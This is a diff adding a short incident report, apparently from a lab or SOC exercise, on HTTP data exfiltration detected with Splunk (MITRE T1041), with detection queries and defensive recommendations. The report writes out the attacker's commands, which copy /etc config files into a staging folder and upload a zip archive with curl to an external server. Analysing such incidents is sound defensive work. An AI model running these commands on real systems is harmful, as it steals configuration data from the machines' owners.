@@ -1,0 +1,45 @@
+Title: Suspicious Data Exfiltration Over HTTP Detected (MITRE T1041)
+
+Date: 2025-06-28
+Analyst: lief@siem-server  
+Tool: Splunk  
+Log Source: /var/log/syslog
+
+---
+
+🔍 Summary:
+We identified data exfiltration over HTTP using the `curl` command, which sent a compressed `.zip` archive of config files (`/etc/*.conf`) to an external HTTP server.
+
+---
+
+🧪 Attack Flow:
+
+1. Attacker staged files using:
+   find /etc -type f -name "*.conf" -readable -exec cp {} /tmp/exfil/ \;
+
+2. Compressed the folder into `data_loot.zip`.
+
+3. Transmitted to attacker server using:
+   curl -X POST -F "file=@data_loot.zip" http://192.168.177.128:8000/upload
+
+---
+
+📌 Detection:
+
+- Splunk query:  
+  index=* curl OR "192.168.177.128"
+
+- Additional context:  
+  zip, /tmp/exfil, POST HTTP
+
+---
+
+🛡️ Recommendation:
+
+- Block unauthorized outbound HTTP uploads.
+- Monitor file movements to staging areas like `/tmp`.
+- Set up alerts for tools like `curl` and `scp` in unexpected locations.
+
+---
+
+MITRE Technique: T1041 – Exfiltration Over Command and Control Channel  
